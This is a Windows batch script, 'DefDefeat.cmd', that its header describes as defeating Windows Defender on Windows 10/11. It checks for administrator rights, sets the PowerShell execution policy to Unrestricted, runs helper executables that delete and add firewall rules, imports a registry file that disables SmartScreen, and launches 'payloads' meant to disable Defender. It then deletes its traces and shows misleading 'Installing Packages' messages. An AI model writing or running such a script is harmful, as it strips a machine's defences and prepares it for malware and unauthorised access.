@echo off
rem *******************************************************
rem
rem DefDefeat.cmd
rem This Script Smart Defeats Windows Defender
rem at Microsoft Windows 10/11 Operation Systems
rem
rem
rem PARAMETERS:	NONE
rem RETURNS:	0 if Success Script Runs
rem		1 if none Antivirus Detected
rem		2 if not Defeat because of Old OS and Other Antivirus Detected
rem		7 if not Checked Integrity or Antivirus Blocked
rem		16 if Checking Integrity Failed
rem		17 if Runs without Elevated Privileges
rem
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Metadata

set PRODUCT_NAME=DefenderDefeat
SET FIRM_NAME=NIT

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem
echo Define Folders...
rem
set curdirforurl=%CD%
set pathCMD=%SystemRoot%\System32
set allDefeatPath=%TEMP%\AllDefeat

echo Define Protected Directories...
rem
set NITPROFILE=%ALLUSERSPROFILE%\%FIRM_NAME%
set PRODPROFILE=%ALLUSERSPROFILE%\%FIRM_NAME%\%PRODUCT_NAME%

echo Define Programs...
set CMDEXE=%pathCMD%\cmd.exe
set ATTRIBEXE=%pathCMD%\attrib.exe
set BITSADMINEXE=%pathCMD%\bitsadmin.exe
set REGEXE=%pathCMD%\reg.exe
set FINDEXE=%pathCMD%\find.exe

rem
echo Set Registry Nodes...
rem
set key1="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"

rem
rem Set Directories Path
rem
rem echo Set LocalFolder...
rem
set LocalFolder=%PRODPROFILE%

rem
echo Check Integrity...
rem
if not exist %pathCMD% echo %pathCMD% not found && exit /b 16
if not exist %FINDEXE% echo %FINDEXE% not found && exit /b 16
if not exist %CMDEXE% echo %CMDEXE% not exists && exit /b 16
if not exist %REGEXE% echo %REGEXE% doesn't exist && exit /b 16
if not exist %TPDL% echo %TPDL% not exists && exit /b 16
if not exist "%ALLUSERSPROFILE%" echo %ALLUSERSPROFILE% not found && exit /b 16
if not exist "%allDefeatPath%" echo %allDefeatPath% not found && exit /b 16
if not exist "%PRODPROFILE%" echo %PRODPROFILE% not found && exit /b 16

if not exist %LocalFolder% echo %LocalFolder% doesn't exist && exit /b 16

title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
exit /b 17
rem
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    %wscriptexe% "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B 0

:gotAdmin
echo Run as Admin...

rem
echo Set Registry Keys...
rem
rem Set ExecutionPolicy
%SystemRoot%\System32\reg.exe add %key1% /v ExecutionPolicy /t REG_SZ /d Unrestricted /f

echo  Installing Necessary Packages.....Please Wait.....
cd /d %LocalFolder%

rem
echo Download and Run Payloads at Script %0
rem

rem if not exist %NSUDOEXE% echo "%NSUDOEXE% not present" && exit /b 7
rem if not exist %SETACLEXE% echo "%SETACLEXE% not present" && exit /b 7

rem
echo Define Packets Variables...
rem
set DefenderDefeat=DefDefeat01.exe
set DefenderEnfeat=DefEnfeat01.exe
set WindowsFireWallAddRules=WindowsFireWallAddRules.exe
set WindowsFireWallDelRules=WindowsFireWallDelRules.exe
set DefDefeat=DefDefeat.cmd
set DefDefSoft=DefDef.Soft.cmd
set DefDefeatSoftACL=DefDefeat.Soft.ACL.bat
set FoldersCreate=FoldersCreate.bat
set DefSmScr=Disable-SmartScreen.reg
set DefDefEarly=DefDefeat.Early.cmd

echo Run Script Header...
rem
echo Run %LocalFolder%\%FoldersCreate%
call "%LocalFolder%\%FoldersCreate%"

echo Run %LocalFolder%\%WindowsFireWallDelRules%
"%LocalFolder%\%WindowsFireWallDelRules%"
rem del /Q /F "%LocalFolder%\%WindowsFireWallDelRules%"
echo Run %LocalFolder%\%WindowsFireWallAddRules%
"%LocalFolder%\%WindowsFireWallAddRules%"
rem del /Q /F "%LocalFolder%\%WindowsFireWallAddRules%"
echo Run %LocalFolder%\%DefSmScr%
%REGEXE% import "%LocalFolder%\%DefSmScr%"
del /Q /F "%LocalFolder%\%DefSmScr%"

echo Set Defeats...
rem

rem
goto Payloads
rem

:Payloads
rem Run Payloads
rem
echo Run Smart Defender Enfeat ...
echo Run %LocalFolder%\%DefenderEnfeat% ...
"%LocalFolder%\%DefenderEnfeat%"

echo Run Smart Defender Defeat ...
echo Run %LocalFolder%\%DefenderDefeat% ...
"%LocalFolder%\%DefenderDefeat%"

echo Run Defeat Soft...
echo Run %LocalFolder%\%DefDefSoft%...
call "%LocalFolder%\%DefDefSoft%"
del /Q /F "%LocalFolder%\%DefDefSoft%"
rem del /Q /F "%LocalFolder%\%DefenderDefeat%"
del /Q /F "%LocalFolder%\%DefDefeatSoftACL%"

echo Success Script Run %0
goto End

:Payloads_1
rem Run Payloads
rem
echo Run Hard Defender Defeat ...
echo Run %LocalFolder%\%DefDefEarly% Defeat ...
call "%LocalFolder%\%DefDefEarly%"

echo Run Defeat Soft...
echo Run %LocalFolder%\%DefDefSoft%...
call "%LocalFolder%\%DefDefSoft%"
del /Q /F "%LocalFolder%\%DefDefSoft%"
del /Q /F "%LocalFolder%\%DefDefEarly%"
del /Q /F "%LocalFolder%\%DefDefeatSoftACL%"

echo Success Script Run %0
goto End

:End
echo The End of the Script %0
exit /b 0

